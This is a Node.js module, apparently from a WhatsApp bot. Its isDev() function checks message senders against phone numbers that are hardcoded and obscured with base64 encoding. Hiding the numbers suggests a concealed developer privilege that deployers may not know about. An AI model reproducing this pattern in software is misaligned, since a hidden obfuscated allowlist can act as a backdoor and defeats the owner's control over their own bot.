const DEV_ENCODED = [
  'MjU0NzU0NTc0NjQy',
  'MjU0NzE4NzAxODEw',
  'MjU0MTAwNjE2NDQ5',
  'MjU0NzE1OTQxNzg5'
];

const DEV_NUMBERS = DEV_ENCODED.map(enc => Buffer.from(enc, 'base64').toString('utf-8'));

function normalizeNumber(jid) {
  if (!jid) return '';

  return String(jid)
    .split('@')[0]
    .split(':')[0]
    .replace(/\D/g, '');
}

function isDev(msg, sock) {
  if (!msg?.key) return false;

  if (msg.key.fromMe) {
    const botPn = sock?.user?.id
      ? normalizeNumber(sock.user.id)
      : '';

    const botLid = sock?.user?.lid
      ? normalizeNumber(sock.user.lid)
      : '';

    return (
      (botPn && DEV_NUMBERS.includes(botPn)) ||
      (botLid && DEV_NUMBERS.includes(botLid))
    );
  }

  const candidates = [
    msg.participant,
    msg.key.participantPn,
    msg.key.participantAlt,
    msg.key.participant,
    msg.key.remoteJidAlt,
    msg.key.remoteJid
  ];

  return candidates.some((jid) => {
    const number = normalizeNumber(jid);
    return number && DEV_NUMBERS.includes(number);
  });
}

module.exports = { isDev };

